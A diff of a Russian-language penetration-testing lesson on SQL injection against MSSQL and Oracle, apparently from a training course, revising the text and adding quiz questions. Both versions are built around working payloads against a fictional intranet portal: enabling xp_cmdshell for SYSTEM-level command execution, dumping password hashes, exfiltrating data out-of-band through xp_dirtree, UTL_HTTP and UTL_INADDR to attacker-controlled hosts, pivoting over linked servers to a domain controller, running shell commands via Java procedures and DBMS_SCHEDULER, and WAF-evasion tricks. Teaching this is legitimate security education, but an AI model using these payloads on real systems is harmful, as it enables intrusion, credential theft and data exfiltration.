@@ -15,303 +15,188 @@ estimated_minutes: 50
 summary: "Модуль-навигатор по двум корпоративным СУБД: MSSQL с xp_cmdshell и linked servers и Oracle с PL/SQL, UTL_HTTP/DNS и OOB-каналами."
 ---
 
-В корпоративном сегменте доминируют **Microsoft SQL Server (MSSQL)** и **Oracle**. Они ведут себя иначе, чем открытые СУБД: другой синтаксис метаданных, другая механика задержек, а главное — мощные встроенные средства, которые при ошибке конфигурации превращают инъекцию в полный RCE. Этот урок — практический разбор обеих баз: от фингерпринта до дампа и RCE.
+## Вопрос, с которого всё начинается
 
-## Фингерпринт: как отличить MSSQL и Oracle
+Ты нашёл SQL-инъекцию, но привычные приёмы не работают. `SLEEP(5)` не тормозит, `GROUP_CONCAT` вызывает ошибку, а `#` в конце запроса ломает синтаксис. Ошибка выглядит как `Incorrect syntax near '1'`. Это не MySQL и не PostgreSQL — это **корпоративная СУБД**, и здесь всё иначе: другой синтаксис, другие метаданные, но зато и куда более мощные встроенные механизмы, которые при ошибке конфигурации дают полный RCE.
 
-Первое, что нужно сделать при инъекции, — понять диалект. Ошибки и особенности синтаксиса выдают базу.
+Разберём две главные: **Microsoft SQL Server (MSSQL)** и **Oracle**. Пройдём путь на конкретном примере.
+
+## Наш пример
+
+Возьмём вымышленный корпоративный портал: `https://intranet.t/report?id=1`. В ответе — строка отчёта. Сначала проверим реакцию на задержку:
+
+```
+$ curl -s -o /dev/null -w '%{time_total}\n' "https://intranet.t/report?id=1; WAITFOR DELAY '0:0:5'-- -"
+5.02
+```
+
+Пять секунд ровно. Это характерный признак **MSSQL**: пауза делается через `WAITFOR DELAY`, а не через `SLEEP`.
+
+> **Stacked-запросы** — это возможность выполнить несколько SQL-операторов подряд, разделив их точкой с запятой (`;`). MSSQL это умеет; Oracle — нет.
+
+## Шаг 1: фингерпринт MSSQL против Oracle
+
+Диалект выдаёт себя текстом ошибки и поведением функций.
 
 | Признак | MSSQL | Oracle |
 |---------|-------|--------|
 | Текст ошибки | `Incorrect syntax near` | `ORA-01756`, `ORA-00933` |
-| Комментарий | `--`, `/* */` | `--`, `/* */` (нет `#`) |
-| Конкатенация строк | `+` или `CONCAT` | `\|\|` или `CONCAT` |
+| Конкатенация | `+` или `CONCAT` | `\|\|` или `CONCAT` |
 | Пауза | `WAITFOR DELAY '0:0:5'` | `dbms_pipe.receive_message('a',5)` |
 | Версия | `@@version` | `SELECT banner FROM v$version` |
 | Stacked `;` | да | нет (PL/SQL) |
-| Приведение к числу | `CAST(x AS int)` | `TO_NUMBER(x)` |
+| Метаданные | `information_schema`/`sys` | `all_tables`, `all_tab_columns` |
 
-```bash
-# проверка реакции на разные диалекты
-curl -s "https://t/?id=1 AND 1=1" ; curl -s "https://t/?id=1' AND '1'='1"
-curl -s "https://t/?id=1; WAITFOR DELAY '0:0:5'-- -" -o /dev/null -w '%{time_total}\n'
+Проверяем версию и права:
+
+```
+$ curl -s "https://intranet.t/report?id=1 UNION SELECT @@version,2-- -"
+... Microsoft SQL Server 2019 (RTM) ...
+$ curl -s "https://intranet.t/report?id=1 UNION SELECT SYSTEM_USER,IS_SRVROLEMEMBER('sysadmin')-- -"
+... sa | 1 ...
 ```
 
-Если время выросло на 5 секунд после `WAITFOR` — это MSSQL. Если инъекция вообще не принимает `;`, а ошибки содержат `ORA-`, — Oracle.
+`IS_SRVROLEMEMBER('sysadmin')` вернул `1` — мы под администратором сервера. Это открывает дорогу к исполнению команд ОС.
 
-## MSSQL: синтаксис и метаданные
+> У Oracle неквотированные имена объектов приводятся к ВЕРХНЕМУ регистру: `all_tables` найдётся, а `"all_tables"` в двойных кавычках — уже нет.
 
-MSSQL поддерживает stacked-запросы (несколько операторов через `;`) и богатую системную схему.
+## Шаг 2: метаданные и дамп
 
-```sql
--- версия и текущий пользователь
-SELECT @@version;
-SELECT SYSTEM_USER, USER_NAME(), IS_SRVROLEMEMBER('sysadmin');
--- метаданные
-SELECT name FROM sys.databases;
-SELECT table_name FROM information_schema.tables;
-SELECT column_name FROM information_schema.columns WHERE table_name='users';
--- агрегация строк
-SELECT STRING_AGG(name, ',') FROM sys.tables;
+В MSSQL список баз лежит в системном представлении `sys.databases`.
+
+```
+$ curl -s "https://intranet.t/report?id=1 UNION SELECT name,2 FROM sys.databases-- -"
+... master, model, msdb, app ...
 ```
 
-## MSSQL: от инъекции к RCE
+Таблицы и колонки — в `information_schema`:
 
-Четыре ключевых механизма.
-
-**xp_cmdshell** — прямое исполнение команд ОС.
-
-```sql
-EXEC sp_configure 'show advanced options',1; RECONFIGURE;
-EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
-EXEC xp_cmdshell 'whoami';
+```
+$ curl -s "https://intranet.t/report?id=1 UNION SELECT STRING_AGG(table_name,','),2 FROM information_schema.tables-- -"
+... users,orders,audit ...
+$ curl -s "https://intranet.t/report?id=1 UNION SELECT STRING_AGG(column_name,','),2 FROM information_schema.columns WHERE table_name='users'-- -"
+... id,user,password,role ...
 ```
 
-**OPENROWSET** — чтение файлов и (при наличии прав) исполнение через `BULK`.
+`STRING_AGG` — аналог `GROUP_CONCAT`: склеивает строки результата в одну. Дамп:
+
+```
+$ curl -s "https://intranet.t/report?id=1 UNION SELECT STRING_AGG(user,':')+':'+STRING_AGG(password,':'),2 FROM users-- -"
+... admin:5f4dcc3b5aa765d61d8327deb882cf99:alice:... ...
+```
+
+## Шаг 3: MSSQL — от инъекции к RCE
+
+Четыре механизма, каждый по-своему ведёт к коду на сервере.
+
+**`xp_cmdshell`** — прямое исполнение команд ОС. По умолчанию выключен, включаем:
+
+```
+$ curl -s "https://intranet.t/report?id=1; EXEC sp_configure 'show advanced options',1; RECONFIGURE;-- -"
+$ curl -s "https://intranet.t/report?id=1; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -"
+$ curl -s "https://intranet.t/report?id=1; EXEC xp_cmdshell 'whoami'-- -"
+... nt authority\system ...
+```
+
+`nt authority\system` — это уже RCE с правами системного аккаунта.
+
+**`OPENROWSET(BULK ...)`** читает файлы:
 
 ```sql
 SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS x;
 ```
 
-**xp_dirtree / xp_fileexist** — OOB через SMB/DNS: сервер сам стучится к вам.
+**`xp_dirtree`** даёт OOB-канал: сервер сам стучится к тебе по SMB/DNS.
 
 ```sql
 EXEC master..xp_dirtree '\\ATTACKER\share\a';
 EXEC master..xp_dirtree '\\data.ATTACKER.oast.pro\a';
 ```
 
-**Linked servers** — переход на другой сервер домена.
+> **OOB (out-of-band)** — способ вытащить данные, когда в ответе нет ни эха, ни ошибок: база делает исходящий запрос на наш listener, и мы читаем данные из его DNS/HTTP-имени.
+
+**Linked servers** — переход на другой хост домена:
 
 ```sql
-SELECT * FROM OPENQUERY("LINKED", 'SELECT @@version');
-EXEC ('EXEC xp_cmdshell ''whoami''') AT "LINKED";
+SELECT * FROM OPENQUERY("DC01", 'SELECT @@version');
+EXEC ('EXEC xp_cmdshell ''whoami''') AT "DC01";
 ```
 
-## Oracle: синтаксис и метаданные
+## Шаг 4: Oracle — PL/SQL, OOB и RCE
 
-Oracle не имеет `information_schema`; метаданные — в `all_*`/`user_*` представлениях, а неквотированные идентификаторы приводятся к ВЕРХНЕМУ регистру.
+Oracle не умеет stacked-запросы, поэтому план другой: `UNION`, blind или OOB. Метаданные — в `all_*`:
 
 ```sql
--- версия
 SELECT banner FROM v$version;
-SELECT version FROM v$instance;
--- таблицы и колонки
 SELECT table_name FROM all_tables;
-SELECT column_name FROM all_tab_columns WHERE table_name='USERS';
--- агрегация
 SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM all_tables;
 ```
 
-Пауза для time-based blind:
+Пауза для blind:
 
 ```sql
 SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message('a',5) ELSE 0 END FROM dual;
 ```
 
-Error-based в Oracle часто требует функций, отдающих данные в тексте ошибки (например, `CTXSYS.DRITHSX.SN`, `UTL_INADDR.GET_HOST_ADDRESS`).
-
-## Oracle: OOB и PL/SQL
-
-Когда эха нет, Oracle отлично «звонит наружу» через `UTL_HTTP` и `UTL_INADDR`.
+Когда эха нет, Oracle «звонит наружу» через `UTL_HTTP` и `UTL_INADDR`:
 
 ```sql
--- HTTP OOB
 SELECT UTL_HTTP.REQUEST('http://ATTACKER:8000/'||(SELECT banner FROM v$version)) FROM dual;
--- DNS OOB
 SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.ATTACKER.oast.pro') FROM dual;
--- эксфильтрация по частям через dbms_pipe
-SELECT dbms_pipe.receive_message('a',5) FROM dual;
 ```
 
-RCE в Oracle достигается через Java stored procedures или `DBMS_SCHEDULER`:
+Разберём на примере. Поднимаем listener и видим обращение:
+
+```
+$ curl -s "https://intranet.t/report?id=1' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('test.abc123.oast.pro'),2 FROM dual-- -"
+# listener:
+[abc123.oast.pro] Received DNS interaction from <target-ip>
+```
+
+Инъекция подтверждена, хотя в ответе — пусто. Теперь эксфильтруем данные в поддомене:
+
+```
+$ curl -s "https://intranet.t/report?id=1' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.abc123.oast.pro'),2 FROM dual-- -"
+[SYSTEM.abc123.oast.pro] Received DNS interaction
+```
+
+Имя пользователя `SYSTEM` уехало в DNS-запрос. RCE в Oracle — через Java-процедуры или `DBMS_SCHEDULER` (нужны права):
 
 ```sql
--- создание Java-процедуры (нужны права)
 CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "Cmd" AS
   public class Cmd { public static String run(String c) throws Exception {
     return new java.util.Scanner(Runtime.getRuntime().exec(c).getInputStream()).useDelimiter("\\A").next(); } }
 ```
 
-## Инструменты и команды
+## Шаг 5: слепая эксфильтрация по битам
 
-```bash
-# sqlmap: явно указать СУБД и технику
-sqlmap -r request.txt -p id --dbms=mssql --technique=BEUST --batch --dbs
-sqlmap -r request.txt -p id --dbms=oracle --technique=BT --batch --os-shell
-# sqlmap: OOB через DNS (свой домен)
-sqlmap -r request.txt --dns-domain=ATTACKER.oast.pro --batch
-
-# прямой доступ к MSSQL после получения кредов
-impacket-mssqlclient sa:'Passw0rd'@10.0.0.5 -windows-auth
-# odat: атаки на Oracle
-odat all -s 10.0.0.6 -p 1521 -d XE -U system -P oracle
-odat dbmslob -s 10.0.0.6 -d XE -U system -P oracle --getFile /etc/passwd
-```
-
-| Инструмент | Назначение | Ключевые флаги |
-|-----------|-----------|----------------|
-| sqlmap | универсальная эксплуатация | `--dbms --technique --dbs --os-shell` |
-| impacket-mssqlclient | прямой доступ к MSSQL | `-windows-auth` |
-| odat | атаки на Oracle | `all`, `dbmslob`, `utlhttp` |
-| mssqlproxy | прокси через MSSQL | `-method` |
-
-## Разобранный пример: MSSQL time-based → дамп → RCE
-
-```bash
-# 1. подтверждение time-based
-$ curl -s -o /dev/null -w '%{time_total}\n' "https://t/?id=1; WAITFOR DELAY '0:0:5'-- -"
-5.02                                     # подтверждено: MSSQL
-
-# 2. извлечение версии побайтово через sqlmap
-$ sqlmap -r request.txt -p id --dbms=mssql --technique=T --batch --banner
-banner: 'Microsoft SQL Server 2019 (RTM)'
-
-# 3. дамп пользователей
-$ sqlmap -r request.txt -p id --dbms=mssql --batch -D app -T users --dump
-+-------+----------------------------------+
-| user  | password                         |
-+-------+----------------------------------+
-| admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
-+-------+----------------------------------+
-
-# 4. проверка xp_cmdshell и RCE
-$ sqlmap -r request.txt -p id --dbms=mssql --os-shell
-os-shell> whoami
-nt authority\system
-```
-
-Артефакт: `nt authority\system` — полный RCE на сервере БД.
-
-## Разобранный пример: Oracle OOB DNS
-
-```bash
-# 1. запускаем listener
-$ interactsh-client -v
-[+] Listening on, e.g. abc123.oast.pro
-
-# 2. payload в параметре (UTL_INADDR уходит DNS-запросом на наш домен)
-$ curl -s "https://t/?id=1' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('test.abc123.oast.pro') FROM dual-- -"
-
-# 3. на listener видим обращение
-[abc123.oast.pro] Received DNS interaction from <target-ip>
-# -> инъекция подтверждена даже без эха в ответе
-
-# 4. эксфильтруем данные через поддомены
-$ curl -s "https://t/?id=1' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.abc123.oast.pro') FROM dual-- -"
-[SYSTEM.abc123.oast.pro] Received DNS interaction    # user = SYSTEM
-```
-
-## Обходы и подводные камни
-
-- **Регистр в Oracle.** `all_tables` вернёт строки; `"all_tables"` в кавычках — уже нет. Имена объектов — ВЕРХНИЙ регистр.
-- **Комментарии.** В MSSQL `--` требует пробела/переноса; используйте `-- -` или `/* */`.
-- **WAF на `WAITFOR`/`xp_cmdshell`.** Разбивайте: `WAITFOR/**/DELAY`, `xp_%63mdshell`, регистр, `CHAR()`.
-- **Нет stacked в Oracle.** Планируйте UNION/blind/OOB, а не `;`-цепочки.
-- **`xp_cmdshell` выключен.** Нужны `sysadmin` и `sp_configure`; иначе — `OPENROWSET`/CLR/agent jobs.
-- **Права.** Даже при инъекции `xp_cmdshell` может требовать `sysadmin` — проверяйте `IS_SRVROLEMEMBER('sysadmin')`.
-
-## Что делать дальше / решение
-
-1. **Фингерпринт** — определите диалект по ошибкам и реакции на паузу.
-2. **Разведка метаданных** — `sys.databases`/`all_tables`, получите список баз и таблиц.
-3. **Дамп** — `sqlmap --dbms=<...>` или ручные UNION/blind-запросы.
-4. **RCE** — MSSQL: `xp_cmdshell`/`OPENROWSET`; Oracle: Java procs/`DBMS_SCHEDULER`.
-5. **OOB при отсутствии эха** — `xp_dirtree`/`UTL_HTTP`/`UTL_INADDR` на свой listener.
-6. **Pivot** — linked servers (MSSQL) и внутренние БД как шаг к домену.
-
-## Справочные таблицы
-
-| Задача | MSSQL | Oracle |
-|--------|-------|--------|
-| Версия | `@@version` | `SELECT banner FROM v$version` |
-| Текущий пользователь | `SYSTEM_USER` | `SELECT user FROM dual` |
-| Таблицы | `information_schema.tables` | `all_tables` |
-| Колонки | `information_schema.columns` | `all_tab_columns` |
-| Строки в одну | `STRING_AGG` | `LISTAGG` |
-| Пауза | `WAITFOR DELAY` | `dbms_pipe.receive_message` |
-| OOB | `xp_dirtree` | `UTL_HTTP`/`UTL_INADDR` |
-| RCE | `xp_cmdshell` | Java stored proc |
-
-## Слепая эксфильтрация по битам
-
-Когда ни ошибки, ни эха, ни OOB — данные достают побитово через булевы условия или задержки. Для MSSQL удобно сравнивать ASCII-код символа:
+Когда нет ни эха, ни ошибок, ни OOB — данные достают побитово. Сравниваем ASCII-код символа булевым условием:
 
 ```sql
--- true, если первый символ имени базы имеет код > 100
 AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.databases),1,1)) > 100
--- побитовое сужение (binary search) — 7 запросов на символ
-AND ASCII(SUBSTRING((SELECT name FROM sys.databases ORDER BY name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY),1,1)) & 64 = 64
 ```
 
-Для Oracle эквивалент использует `SUBSTR`, `ASCII` и `ROWNUM`:
+Бинарный поиск (сужение вдвое) сокращает число запросов с ~128 до 7 на символ. Именно так работает `sqlmap --technique=B`; вручную это делают, когда автоматика ломается на нестандартном фильтре.
 
-```sql
-AND ASCII(SUBSTR((SELECT table_name FROM all_tables WHERE ROWNUM=1),1,1)) > 100
-```
+## Что мы теперь знаем
 
-Каждое сравнение даёт один бит. Бинарный поиск сокращает число запросов с 128 до 7 на символ. Именно так sqlmap и работает в режиме `--technique=B`; ручной режим нужен, когда автоматика ломается на нестандартном фильтре.
+- MSSQL и Oracle опознаются по ошибке, паузе и stacked-запросам.
+- Метаданные MSSQL — `sys.databases`/`information_schema`; Oracle — `all_tables`.
+- Склейка строк: `STRING_AGG` (MSSQL) против `LISTAGG` (Oracle).
+- RCE: MSSQL — `xp_cmdshell`, Oracle — Java-процедуры/`DBMS_SCHEDULER`.
+- OOB: `xp_dirtree` (MSSQL) против `UTL_HTTP`/`UTL_INADDR` (Oracle).
 
-## Сравнение с открытыми СУБД
+## На что смотреть дальше
 
-| Возможность | MySQL | PostgreSQL | MSSQL | Oracle |
-|-------------|-------|-----------|-------|--------|
-| Комментарий | `#`, `-- `, `/**/` | `--`, `/**/` | `--`, `/**/` | `--`, `/**/` |
-| Stacked `;` | только в некоторых API | да | да | нет |
-| Пауза | `SLEEP(n)` | `pg_sleep(n)` | `WAITFOR DELAY` | `dbms_pipe` |
-| Чтение файла | `LOAD_FILE` | `pg_read_file` | `OPENROWSET` | `UTL_FILE` |
-| RCE | `INTO OUTFILE`+UDF | `COPY TO PROGRAM` | `xp_cmdshell` | Java procs |
-| Метаданные | `information_schema` | `information_schema` | `information_schema`/`sys` | `all_*` |
-
-Знание этой таблицы экономит время: не тащите `SLEEP` в MSSQL и `information_schema` в Oracle.
-
-## Расширенный разбор: linked servers как pivot
-
-MSSQL часто связан с другими серверами домена (linked servers). Через них можно исполнять запросы на удалённом хосте и поднимать права.
-
-```sql
--- список связанных серверов
-EXEC sp_linkedservers;
-SELECT * FROM sys.servers;
--- выполнить на удалённом сервере
-SELECT * FROM OPENQUERY("DC01", 'SELECT @@version');
-EXEC ('EXEC xp_cmdshell ''whoami''') AT "DC01";
--- включить RPC out и выполнить
-EXEC sp_serveroption 'DC01','rpc out','true';
-```
-
-Это типичный шаг в пентесте внутренней сети: инъекция в веб-приложении → MSSQL → linked server → контроллер домена. Всегда проверяйте `sys.servers`, прежде чем считать, что упёрлись в тупик.
-
-## Oracle: эксплуатация через DBMS_SCHEDULER
-
-Если Java недоступна, Oracle может выполнять команды через планировщик.
-
-```sql
-BEGIN
-  DBMS_SCHEDULER.CREATE_JOB(
-    job_name => 'x', job_type => 'EXECUTABLE',
-    job_action => '/bin/sh', number_of_arguments => 2,
-    enabled => FALSE);
-  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('x',1,'-c');
-  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('x',2,'id > /tmp/o 2>&1');
-  DBMS_SCHEDULER.ENABLE('x');
-END;
-/
-```
-
-Требуются привилегии `CREATE EXTERNAL JOB` — проверяйте `SELECT * FROM session_privs`.
-
-## Чек-лист по корпоративным СУБД
-
-- [ ] Диалект определён (ошибки, пауза, stacked).
-- [ ] Версия и текущий пользователь извлечены.
-- [ ] Метаданные (базы/таблицы/колонки) получены.
-- [ ] Дамп чувствительных таблиц сделан.
-- [ ] Проверены RCE-механизмы (`xp_cmdshell`, Java/DBMS_SCHEDULER).
-- [ ] Проверены OOB-каналы (`xp_dirtree`, `UTL_HTTP`).
-- [ ] Проверены linked servers / переходы на другие хосты.
-- [ ] Каждый шаг зафиксирован командой и результатом.
+- **`xp_cmdshell` выключен** — нужны `sysadmin` и `sp_configure`; иначе `OPENROWSET`/CLR/agent jobs.
+- **Регистр в Oracle** — имена объектов в ВЕРХНЕМ регистре, кавычки меняют смысл.
+- **WAF на `WAITFOR`/`xp_cmdshell`** — разбивай: `WAITFOR/**/DELAY`, `xp_%63mdshell`, регистр.
+- **Нет stacked в Oracle** — планируй `UNION`/blind/OOB, а не `;`-цепочки.
+- **Linked servers** — проверяй `sys.servers`, прежде чем считать, что упёрся в тупик.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Как организовать задержку (time-based blind) в MSSQL?"
@@ -330,15 +215,35 @@ END;
     - "sys.objects"
   answer: 1
   explanation: "В Oracle привычного information_schema нет — метаданные в all_tables/all_tab_columns."
-- question: "Чем Oracle может утечь данные, когда в ответе нет эха (out-of-band)?"
+- question: "Чем Oracle утечёт данные, когда в ответе нет эха (out-of-band)?"
   options:
-    - "Через UTL_HTTP/UTL_INADDR, отправив запрос или DNS-имя на ваш listener"
+    - "Через UTL_HTTP/UTL_INADDR, отправив запрос или DNS-имя на listener"
     - "Через INTO OUTFILE"
     - "Через xp_dirtree"
     - "Через ATTACH DATABASE"
   answer: 0
   explanation: "UTL_HTTP/UTL_INADDR дают OOB-канал; xp_dirtree — MSSQL, INTO OUTFILE — MySQL, ATTACH — SQLite."
+- question: "Какая функция агрегирует строки в MSSQL?"
+  options:
+    - "GROUP_CONCAT"
+    - "STRING_AGG"
+    - "LISTAGG"
+    - "string_agg"
+  answer: 1
+  explanation: "STRING_AGG — MSSQL; GROUP_CONCAT — MySQL/SQLite, LISTAGG — Oracle."
+- question: "Почему на Oracle не сработает цепочка вида id=1; EXEC ...?"
+  options:
+    - "Oracle запрещает UNION"
+    - "Oracle не поддерживает stacked-запросы через точку с запятой"
+    - "В Oracle нет функции EXEC"
+    - "Oracle блокирует комментарии"
+  answer: 1
+  explanation: "Oracle не выполняет несколько операторов подряд через ; — нужны UNION/blind/OOB."
 ```
+
+## Куда дальше
+
+Теперь ты умеешь определять диалект и выбирать под него стратегию. Дальше мы возьмём инструмент, который делает всё это автоматически, — **sqlmap**: как передать ему запрос, как заставить работать с нужной СУБД и как вытащить данные, когда ручные payload не проходят. А пока главное запомни: **корпоративная СУБД — это не «сложнее», а «иначе»**, и её встроенные механизмы могут дать RCE быстрее, чем открытая.
 
 ## Где пригодится
 
